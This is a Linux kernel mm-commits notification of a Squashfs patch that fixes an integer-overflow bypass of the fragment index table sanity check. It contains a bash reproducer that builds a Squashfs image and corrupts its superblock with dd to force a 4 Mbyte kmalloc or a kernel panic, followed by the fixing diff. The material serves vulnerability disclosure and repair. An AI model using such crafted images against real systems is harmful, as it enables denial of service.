Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794510641;
	b=TlD8QhdYe4j3UzPQi5zAO7zV9mI+LrUCh3nNomcYp6S/Z3zxuUIWItdvySWgzfriMm2b
	 RHJr5ykvlhhwteFhi5aYwmJ0SLrxlw2xzeCvZiYCWTu2lqnVTSTVcl4BmvML0LEtRCVc8
	 77fmHXrIKIUihUfn8qYNxTUfkiDpjTeQRlImmieYD2po9gcGDJ6zOwc7z+dn3+fTb8OkE
	 NbGALa+as5hgeLwZHfprZ5JN8ZaWFqOLMGQMEzCIMjM/0Wb2ASbU1SyUQTWB/0wtyP38R
	 jOiBGdgBN0Bc+Pci9Kxx5i3Qetln9dANfRxmKA7OYB5zzZQlDQ9Lf4Wdax1zg3Tu6ow==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794510641;
	h=Received:DKIM-Signature:Date:To:From:Subject:Message-Id;
	bh=2qny2sd0XExQ5IvjqOY7t5ohFdLZzTSGcRL5V53JUtw=;
	b=WaD4HQ7XvbDkuSAz150talzyQq6gJclf4QD0kbIYU0/JAdjKQa2c5WsTa+maquQfcn+2
	 sAFoxhsPGJd+WeXylFm0rWVxSR2HDPl45Tko1gNmaD+UIiSq6OkKqy3nTd6tmM8jfYlfb
	 TqiKKLkq0ugffovwE73TEU+hqcZdmSTSUr55W+/XlaRNQL4D0sGlhfyMhmCU21MiTMlZ2
	 Nc+2Ev43JLFXIqqYX/awFts/xKdOI4O0Rmr2VUXTCNgnYzIFn7aaLk/z1dSoQsl/f/q1k
	 2LJf+ORBPT5zdyKXsP2JSFQLcOgx1uV2iy3SL6WujVmAj0TwcnvKjUc2JhdulFGX/Vg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=fUqFnZtp;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DAC0E606A330
	for <mm-commits@vger.kernel.org>; Thu, 12 Nov 2026 19:10:41 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=fUqFnZtp
Received: by smtp.kernel.org (Postfix) with ESMTPSA id A26D81F000C4;
	Thu, 12 Nov 2026 19:10:41 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1794510641;
	bh=2qny2sd0XExQ5IvjqOY7t5ohFdLZzTSGcRL5V53JUtw=;
	h=Date:To:From:Subject;
	b=fUqFnZtp/9w/QEOR1TG0JzuZ5FniUp5MntyjZm9wJTFLH5BqkzyZdIItuMdVnkw9O
	 sFd9HOg68fEymGdYkMDU8L2zZVQAYy+5scLwRkM4vrzQmBj2VtcuiPgU6fnxlrIsT4
	 pAqhCvwSlS1jRFc2SDERuCGnChwzCiirWb+Lgwm4=
Date: Thu, 12 Nov 2026 11:10:41 -0800
To: mm-commits@vger.kernel.org,phillip.lougher@gmail.com,
	phillip@squashfs.org.uk,akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
Subject: + squashfs-fix-fragment-index-table-length-too-large-exploit.patch added to mm-nonmm-unstable branch
Message-Id: <20261112191041.A26D81F000C4@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: fix fragment index table length too large exploit
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-fix-fragment-index-table-length-too-large-exploit.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-fix-fragment-index-table-length-too-large-exploit.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: fix fragment index table length too large exploit
Date: Wed, 11 Nov 2026 23:43:49 +0000

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Link: https://lore.kernel.org/20261111234402.252354-10-phillip@squashfs.org.uk
Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
---

 fs/squashfs/fragment.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

--- a/fs/squashfs/fragment.c~squashfs-fix-fragment-index-table-length-too-large-exploit
+++ a/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_tab
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-block-count.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

